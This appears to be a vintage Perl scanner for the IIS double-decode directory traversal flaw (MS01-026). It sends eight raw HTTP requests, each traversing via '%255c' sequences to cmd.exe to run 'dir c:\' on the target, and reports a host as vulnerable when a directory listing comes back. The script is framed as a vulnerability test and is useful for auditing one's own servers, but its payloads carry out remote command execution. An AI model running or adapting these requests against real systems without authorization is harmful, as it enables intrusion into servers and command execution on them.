#!/usr/bin/perl
# modified for the new exploit released by NSFOCUS.COM
# -kM (don't give me credit)
#
# Very simple PERL script to test a machine for Unicode vulnerability. 
# Use port number with SSLproxy for testing SSL sites
# Usage: unicodecheck IP:port
# Only makes use of "Socket" library
# Roelof Temmingh 2000/10/21
# roelof@sensepost.com http://www.sensepost.com
#

use Socket;
# --------------init
if ($#ARGV<0) {die "Usage: perl cgidecodecheck.pl IP:port\n";}
($host,$port)=split(/:/,@ARGV[0]);
print "Testing $host:$port : \n";
$target = inet_aton($host);
$flag=0;
# ---------------test method 1
my @results=sendraw("GET /scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\ HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {
 	$flag=1;
 	print "Vulnerable to $flag: \n /scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\\ \n";}
 	}
# ---------------test method 2
my @results=sendraw("GET /msadc/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\ HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {
 	$flag=3;
 	print "Vulnerable to $flag: \n /msadc/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\\ \n";}}
# ---------------test method 3
my @results=sendraw("GET /cgi-bin/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\ HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {
 	$flag=4;
 	print "Vulnerable to $flag: \n /cgi-bin/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\\ \n";}}
# ---------------test method 4
my @results=sendraw("GET /samples/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\ HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {
 	$flag=5;
 	print "Vulnerable to $flag: \n /samples/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\\ \n";}}
# ---------------test method 5
my @results=sendraw("GET /iisadmpwd/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\ HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {
 	$flag=6;
 	print "Vulnerable to $flag: \n /iisadmpwd/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\\ \n";}}
# ---------------test method 6
my @results=sendraw("GET /_vti_cnf/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\ HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {
 	$flag=7;
 	print "Vulnerable to $flag: \n /_vti_cnf/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\\ \n";}}
# ---------------test method 7
my @results=sendraw("GET /_vti_bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\ HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {
 	$flag=8;
 	print "Vulnerable to $flag: \n /_vti_bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\\ \n";}}
# ---------------test method 8
my @results=sendraw("GET /adsamples/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\ HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {
 	$flag=9;
 	print "Vulnerable to $flag: \n /adsamples/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\\ \n";}}


# ---------------result
if ($flag>0){print "\n Vulnerable: \n Read http://www.microsoft.com/technet/security/bulletin/MS01-026.asp\n";}
else {print "Safe\n";}
# ------------- Sendraw - thanx RFP rfp@wiretrip.net
sub sendraw {   # this saves the whole transaction anyway
        my ($pstr)=@_;
        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
                die("Socket problems\n");
        if(connect(S,pack "SnA4x8",2,$port,$target)){
                my @in;
                select(S);      $|=1;   print $pstr;
                while(<S>){ push @in, $_;}
                select(STDOUT); close(S); return @in;
        } else { die("Can't connect...\n"); }
}



